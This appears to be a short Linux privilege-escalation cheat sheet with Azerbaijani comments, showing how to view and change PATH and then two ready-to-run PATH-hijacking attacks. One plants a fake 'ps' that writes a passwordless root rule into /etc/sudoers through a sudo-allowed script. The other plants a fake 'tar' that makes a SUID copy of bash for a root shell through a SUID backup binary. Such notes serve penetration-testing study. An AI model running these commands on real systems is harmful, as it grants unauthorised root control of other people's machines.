# List Paths
```powershell
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

# Add Path
```powershell
export PATH=.:$PATH
echo $PATH
```

# Path Abuse with SUDO
```powershell
sudo ls

# Hədəf: istifadəçi sudo ilə /usr/bin/statuscheck işlədə bilər
# /usr/bin/statuscheck içərisində "ps" və ya "ls" çağırılır

cd /tmp
echo '#!/bin/bash' > ps
echo 'echo "root ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' >> ps
chmod +x ps
export PATH=/tmp:$PATH
sudo /usr/bin/statuscheck  # statuscheck ps çağıranda bizim ps işləyər
```

# Path Abuse with SUID/GUID
```powershell
# SUID binary varsa və system() və ya popen() istifadə edirsə
# Məsələn: /usr/local/bin/backup (root SUID)
# backup içərisində: system("tar -czf /backup/data.tar.gz /important")

cd /tmp
echo '#!/bin/bash' > tar
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> tar
chmod +x tar
export PATH=/tmp:$PATH
/usr/local/bin/backup  # bizim tar işləyər
/tmp/rootbash -p       # root shell
```
